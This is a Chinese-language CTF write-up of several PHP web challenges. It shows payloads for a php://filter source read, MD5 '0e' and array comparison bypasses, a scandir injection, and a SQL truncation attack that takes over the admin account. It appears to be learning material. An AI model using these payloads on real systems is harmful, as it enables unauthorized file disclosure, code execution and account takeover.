Web 14

http://114.67.246.176:11964/index.php?file=show.php 这是页面的url，我们就可以知道可以通过index.php文件通过$_GET来读取其他文件，根据题目可知flag在index.php中，但是无法直接读取，可以用base64的方法读取，构造url

php://filter/read=convert.base64-encode/resource=index.php

php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是base64编码后， resource=index.php表示目标文件为index.php。

访问后得到的代码再经过base64的解码，就可以成功拿到flag。

Web 16

根据题目知道要找备份文件，看完别人的解法知道要用到御剑这个软件扫描备份文件，成功扫出然后下载了一个index.php.bak的文件，其中有两端代码是比较关键的

1.$str = str_replace('key','',$str); 将key替换，所以等等需要使用双写

2.if(md5($key1) == md5($key2) && $key1 !== $key2){
echo $flag."取得flag";
} 需要使md5加密过后的key1值与key2值相同，但是两者原本的值不能相同，这涉及到了MD5的绕过

md5加密之后以0e开头的，值都为0，那是因为0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。

常见的0e开头：

可以将这些值赋予key1,2 例如?kekeyy1=s878926199a&kekeyy2=s214587387a或者?kekeyy1=QNKCDZO&kekeyy2=s214587387a（这里用到了双写），这样就可以得到flag。

还有另一种解法，md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的，也就是构造下列的payload：?kekeyy1[]=aa&kekeyy2[]=bb，同样能得到flag。

Web 22

本关要用到php scandir()函数

print_r()函数用于打印变量

scandir()函数的作用是扫描文件夹下的目录和文件，返回值为所有文件名组成的一个数组

我们需要读取当前目录，根据代码提示可以构建一个payload：?s=print_r(scandir('./'))。（./是当前目录，如果想读取父级目录可以改为../）

之后就可以得到一个.txt的文件，打开便能拿到flag。

Web 25 SQL约束攻击

SQL约束攻击的原理就是利用的约束条件，比如最长只能有15个字符的话，如果你输入的是abcdefghijklmnop(16位），那么保存在数据库里的就是abcdefghijklmno，那么别人用abcdefghijklmno注册一个用户名，就可以登陆。

还有一个可以利用的地方就是SQL在执行字符串处理的时候是会自动修剪掉尾部的空白符的，也就是说”abc”==”abc “，同样我们可以通过注册用户名为”abc “的账号来登陆”abc”的账号。

题目中说的是约束攻击那就试着用”admin “（注意有个空格）注册了一个账号，用这个的密码登陆”admin”账号，然后就看到了flag。

Web 27

根据题目提示得知这题是md5碰撞，看源码

需要用get型得到一个a的值，a不能与QNKCDZO相同，并且QNKCDZO经过md5加密过的值要与a加密过的值相等

拓展：一个数字和一个字符串进行比较，PHP会把字符串转换成数字再进行比较。PHP转换的规则的是：若字符串以数字开头，则取开头数字作为转换结果，若无则输出0。例如：123abc转换后应该是123，而abc则为0，0==0这当然是成立的啦！所以，0 ==’abc’是成立的。当有一个对比参数是整数的时候，会把另外一个参数强制转换为整数。

所以只需找一个md5加密后开头为0e的值赋给a即可 payload：http://114.67.246.176:17240/?a=240610708
